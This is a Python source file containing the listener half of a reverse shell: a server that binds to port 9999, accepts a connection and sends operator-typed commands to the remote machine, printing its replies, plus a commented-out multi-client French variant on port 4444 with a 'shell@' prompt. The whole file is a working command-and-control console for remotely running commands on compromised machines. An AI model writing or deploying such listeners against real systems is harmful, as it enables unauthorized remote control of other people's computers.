import socket
import sys

# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print(f"Socket binding error: {msg}\nRetrying...")
        socket_bind()

# Establish a connection with client (socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands
def send_commands(conn):
    while True:
        cmd = input("# ")
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
















'''
import socket
import threading
import os

HOST = "0.0.0.0" # Écoute sur toutes les interfaces
PORT = 4444

def handle_client(client_socket, addr):
    print(f"[+] Connexion de {addr[0]}:{addr[1]}")

    try:
        while True:
            cmd = input(f"[shell@{addr[0]}]$ ")
            
            if cmd.strip().lower() == "exit":
                client_socket.send(b"exit")
                break

            if cmd.strip() == "":
                continue

            client_socket.send(cmd.encode())
            response = client_socket.recv(4096).decode(errors='ignore')
            print(response)
    except Exception as e:
        print(f"[-] Erreur : {e}")
    finally:
        client_socket.close()
        print("[*] Connexion fermée.")

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] En écoute sur le port {PORT}...")

    while True:
        client, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client, addr))
        client_thread.start()

if __name__ == "__main__":
    start_listener()
'''